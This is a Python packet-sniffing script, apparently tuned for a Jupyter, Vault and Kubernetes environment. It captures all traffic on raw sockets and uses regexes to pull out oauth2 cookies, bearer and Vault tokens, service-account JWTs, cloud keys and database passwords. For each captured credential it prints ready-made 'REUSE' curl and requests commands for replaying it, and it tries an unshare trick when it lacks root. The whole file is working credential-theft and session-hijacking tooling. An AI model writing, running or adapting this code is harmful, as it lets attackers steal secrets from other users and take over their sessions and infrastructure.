#!/usr/bin/env python3
"""
full_sniff.py — based on your working version
Logs ALL packets in full, highlights interesting ones
"""
import socket, struct, re, os, sys
from datetime import datetime
from collections import defaultdict

# ── Config ────────────────────────────────────────────────
INTERFACES  = ["lo", "eth0", "tunl0"]
OUTFILE     = f"sniff_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

EXTRACTORS = {
    "OAUTH2_COOKIE": [
        r'_oauth2_proxy=([^;\s\r\n]{10,})',
    ],
    "BEARER_TOKEN": [
        r'[Aa]uthorization:\s*[Bb]earer\s+([^\s\r\n]{10,})',
        r'[Aa]uthorization:\s*[Tt]oken\s+([^\s\r\n]{10,})',
    ],
    "VAULT_TOKEN": [
        r'[Xx]-[Vv]ault-[Tt]oken:\s*([^\s\r\n]{10,})',
        r'"client_token"\s*:\s*"([^"]{10,})"',
        r's\.[A-Za-z0-9]{24}',
    ],
    "K8S_SA_TOKEN": [
        r'[Aa]uthorization:\s*[Bb]earer\s+(eyJ[^\s\r\n]{50,})',
    ],
    "COOKIE_HEADER": [
        r'[Cc]ookie:\s*([^\r\n]{20,})',
        r'[Ss]et-[Cc]ookie:\s*([^\r\n]{20,})',
    ],
    "S3_ACCESS_KEY": [
        r'[Aa]ws-[Aa]ccess-[Kk]ey-[Ii]d[=:\s]+([A-Z0-9]{16,})',
        r'X-Amz-Credential=([^/&\s]+)',
    ],
    "S3_SECRET_KEY": [
        r'[Aa]ws-[Ss]ecret[=:\s]+([A-Za-z0-9+/]{20,})',
    ],
    "DB_PASSWORD": [
        r'[Pp]assword[=:\s"]+([^\s"&\r\n]{6,})',
        r'postgresql://[^:]+:([^@]+)@',
        r'mongodb://[^:]+:([^@]+)@',
        r'redis://:([^@]+)@',
    ],
    "KEYCLOAK_TOKEN": [
        r'"access_token"\s*:\s*"([^"]{20,})"',
        r'"refresh_token"\s*:\s*"([^"]{20,})"',
    ],
    "API_KEY": [
        r'[Xx]-[Aa][Pp][Ii]-[Kk]ey:\s*([^\s\r\n]{10,})',
    ],
}

PORT_LABELS = {
    10443:"Jupyter-TLS", 8080:"VSCode/API",
    8081:"Jupyter",      8200:"Vault",
    8443:"oauth2-proxy", 443:"HTTPS",
    5432:"PostgreSQL",   27017:"MongoDB",
    6379:"Redis",        9090:"Prometheus",
    6443:"k8s-API",      2379:"etcd",
    53:"DNS",            9000:"MinIO",
    80:"HTTP",           8888:"Jupyter-int",
    10250:"Kubelet",
}

found    = defaultdict(set)
sessions = {}
stats    = {"total":0, "hits":0, "packets_logged":0}

# ── Writer ────────────────────────────────────────────────

def log(f, msg, important=False):
    ts     = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    prefix = "!!!" if important else "   "
    line   = f"[{ts}] {prefix} {msg}"
    print(line)
    f.write(line + "\n")
    f.flush()

def log_raw(f, msg):
    """Write without timestamp — for raw payload blocks"""
    print(msg)
    f.write(msg + "\n")
    f.flush()

# ── Full packet logger ────────────────────────────────────

def log_packet(f, src, dst, sport, dport,
               proto, flags, payload, iface):
    """Log the complete packet — header + full raw payload"""

    sl = f"{sport}"
    dl = f"{dport}"
    if sport in PORT_LABELS:
        sl = f"{sport}[{PORT_LABELS[sport]}]"
    if dport in PORT_LABELS:
        dl = f"{dport}[{PORT_LABELS[dport]}]"

    # ── Packet header line ────────────────────────────────
    log_raw(f, "")
    log_raw(f, "═" * 72)
    log_raw(f,
        f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}]"
        f" {proto} iface={iface}"
        f" {src}:{sl} → {dst}:{dl}"
        f" flags={flags}"
        f" payload={len(payload)}b"
    )
    log_raw(f, "─" * 72)

    if not payload:
        log_raw(f, "  (no payload)")
        return

    # ── Raw text payload ──────────────────────────────────
    log_raw(f, "  ┌── RAW TEXT ──────────────────────────────────")
    try:
        text = payload.decode("utf-8", errors="replace")
        for line in text.splitlines():
            log_raw(f, f"  │ {line}")
    except:
        log_raw(f, f"  │ (decode failed)")
    log_raw(f, "  └──────────────────────────────────────────────")

    # ── Hex dump (first 256 bytes) ────────────────────────
    if len(payload) > 0:
        log_raw(f, "  ┌── HEX DUMP (first 256 bytes) ───────────────")
        for i in range(0, min(len(payload), 256), 16):
            chunk   = payload[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in chunk)
            asc_str = ''.join(
                chr(b) if 32 <= b < 127 else '.'
                for b in chunk
            )
            log_raw(f,
                f"  │ {i:04x}  {hex_str:<48}  {asc_str}"
            )
        if len(payload) > 256:
            log_raw(f,
                f"  │ ... ({len(payload)-256} more bytes)"
            )
        log_raw(f, "  └──────────────────────────────────────────────")

    # ── Extracted interesting values ──────────────────────
    try:
        text = payload.decode("utf-8", errors="replace")
    except:
        return

    hits = []
    for label, patterns in EXTRACTORS.items():
        for pattern in patterns:
            matches = re.findall(pattern, text,
                                 re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                match = match.strip()
                if len(match) < 6:
                    continue
                hits.append((label, match))
                found[label].add(match)
                stats["hits"] += 1

    if hits:
        log_raw(f, "  ╔══ !!! EXTRACTED VALUES !!! ═══════════════════")
        for label, value in hits:
            log_raw(f, f"  ║  [{label}]")
            log_raw(f, f"  ║  {value}")

            # Usage hints
            if "OAUTH2" in label:
                m = re.search(
                    r'_oauth2_proxy=([^\s;,\r\n]+)',
                    value
                )
                if m:
                    v = m.group(1)
                    log_raw(f,
                        f"  ║  → REUSE: curl -k "
                        f"-H 'Cookie: _oauth2_proxy={v}'"
                        f" https://TARGET:10443/PREFIX/api"
                    )
                    log_raw(f,
                        f"  ║  → REUSE: requests.get(url,"
                        f" headers={{'Cookie':"
                        f"'_oauth2_proxy={v}'}})"
                    )

            elif "BEARER" in label:
                m = re.search(
                    r'(?i)bearer\s+([^\s\r\n]+)',
                    value
                )
                if m:
                    v = m.group(1)
                    log_raw(f,
                        f"  ║  → REUSE: curl -k "
                        f"-H 'Authorization: Bearer {v}'"
                        f" https://TARGET/api"
                    )

            elif "VAULT" in label:
                log_raw(f,
                    f"  ║  → REUSE: curl -k "
                    f"-H 'X-Vault-Token: {value}'"
                    f" $VAULT/v1/auth/token/lookup-self"
                )

            elif "K8S_SA" in label:
                try:
                    import base64, json
                    parts = value.split('.')
                    pad   = parts[1] + \
                            '=' * (4-len(parts[1]) % 4)
                    pl    = json.loads(
                        base64.b64decode(pad)
                    )
                    ns = pl.get('kubernetes.io',{})\
                           .get('namespace','?')
                    sa = pl.get('kubernetes.io',{})\
                           .get('serviceaccount',{})\
                           .get('name','?')
                    log_raw(f,
                        f"  ║  → JWT decoded: "
                        f"namespace={ns} sa={sa}"
                    )
                except:
                    pass

            log_raw(f, "  ║")
        log_raw(f, "  ╚═══════════════════════════════════════════════")

    stats["packets_logged"] += 1

# ── Socket opener (from your working version) ─────────────

def open_raw_socket(iface):
    try:
        s = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003)
        )
        s.bind((iface, 0))
        s.settimeout(0.1)
        return s
    except Exception as e:
        print(f"  Cannot open {iface}: {e}")
        return None

# ── Interface handler (from your working version) ─────────

def sniff_interface(iface, f, stats):
    sock = stats.get(f"sock_{iface}")
    if not sock:
        return

    try:
        raw, _ = sock.recvfrom(65535)
    except socket.timeout:
        return
    except Exception:
        return

    stats["total"] += 1

    if len(raw) < 14:
        return

    eth_type = struct.unpack("!H", raw[12:14])[0]

    # Handle ethernet frames
    if eth_type == 0x0800:
        ip_data = raw[14:]
    elif eth_type not in [0x0800, 0x86DD]:
        # Loopback may have no ethernet header
        # Try treating whole packet as IP
        ip_data = raw
    else:
        return  # IPv6, skip

    if len(ip_data) < 20:
        return

    # Parse IP header
    iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
    proto = iph[6]
    src   = socket.inet_ntoa(iph[8])
    dst   = socket.inet_ntoa(iph[9])
    ihl   = (iph[0] & 0xF) * 4
    rest  = ip_data[ihl:]

    # ── TCP ───────────────────────────────────────────────
    if proto == 6 and len(rest) >= 20:
        tcph    = struct.unpack("!HHLLBBHHH", rest[:20])
        sport   = tcph[0]
        dport   = tcph[1]
        flags   = tcph[5]
        offset  = (tcph[4] >> 4) * 4
        payload = rest[offset:]

        # Decode flags
        fs = "".join([
            "S" if flags & 0x02 else "",
            "A" if flags & 0x10 else "",
            "F" if flags & 0x01 else "",
            "R" if flags & 0x04 else "",
            "P" if flags & 0x08 else "",
        ]) or "."

        # Log the full packet regardless
        log_packet(f, src, dst, sport, dport,
                   "TCP", fs, payload, iface)

    # ── UDP ───────────────────────────────────────────────
    elif proto == 17 and len(rest) >= 8:
        sport   = struct.unpack("!H", rest[:2])[0]
        dport   = struct.unpack("!H", rest[2:4])[0]
        payload = rest[8:]

        log_packet(f, src, dst, sport, dport,
                   "UDP", "-", payload, iface)

    # ── ICMP ──────────────────────────────────────────────
    elif proto == 1 and len(rest) >= 2:
        log_raw(f,
            f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}]"
            f"    ICMP iface={iface}"
            f" {src} → {dst}"
            f" type={rest[0]} code={rest[1]}"
        )

    # ── Other ─────────────────────────────────────────────
    else:
        log_raw(f,
            f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}]"
            f"    IP iface={iface}"
            f" {src} → {dst}"
            f" proto={proto}"
        )


# ── Main (same structure as your working version) ─────────

def main():
    print(f"[*] Full packet sniffer")
    print(f"[*] Output: {OUTFILE}")
    print(f"[*] Interfaces: {INTERFACES}")
    print(f"[*] Logging ALL packets + highlighting secrets")
    print(f"[*] Ctrl+C to stop\n")

    if os.geteuid() != 0:
        print("Not root — trying unshare...")
        os.execvp("unshare", [
            "unshare", "--user", "--map-root-user",
            "--", sys.executable
        ] + sys.argv)

    with open(OUTFILE, "w", buffering=1) as f:
        log(f, f"Sniffer started: {datetime.now()}")
        log(f, f"Interfaces: {INTERFACES}")
        log(f, f"Mode: ALL packets logged")

        # Open sockets — exactly as your working version
        for iface in INTERFACES:
            sock = open_raw_socket(iface)
            if sock:
                stats[f"sock_{iface}"] = sock
                log(f, f"Listening on {iface}")
            else:
                log(f, f"Skipping {iface} (unavailable)")

        if not any(
            f"sock_{i}" in stats for i in INTERFACES
        ):
            log(f, "ERROR: No interfaces opened!")
            return

        # Main loop — identical to your working version
        try:
            while True:
                for iface in INTERFACES:
                    sniff_interface(iface, f, stats)

                if stats["total"] % 10000 == 0 \
                   and stats["total"] > 0:
                    log(f,
                        f"[stats] total={stats['total']}"
                        f" logged={stats['packets_logged']}"
                        f" hits={stats['hits']}"
                    )

        except KeyboardInterrupt:
            pass

        # ── Summary ───────────────────────────────────────
        log_raw(f, "\n" + "═" * 60)
        log_raw(f, "FINAL SUMMARY — EXTRACTED VALUES")
        log_raw(f, "═" * 60)

        for label, values in found.items():
            if not values:
                continue
            log_raw(f, f"\n[{label}] — {len(values)} unique:")
            for v in sorted(values):
                log_raw(f, f"  {v}")

        log_raw(f, "\n" + "═" * 60)
        log_raw(f,
            f"total packets : {stats['total']}\n"
            f"packets logged: {stats['packets_logged']}\n"
            f"secrets found : {stats['hits']}\n"
            f"output file   : {OUTFILE}"
        )

    print(f"\n[*] Done → {OUTFILE}")
    print(f"[*] Quick search:")
    print(f"    grep '!!!' {OUTFILE}      # highlights only")
    print(f"    grep '║' {OUTFILE}        # extracted values")
    print(f"    grep 'oauth2' {OUTFILE}   # oauth cookies")
    print(f"    grep 'RAW TEXT' -A20 {OUTFILE}  # payloads")


if __name__ == "__main__":
    main()
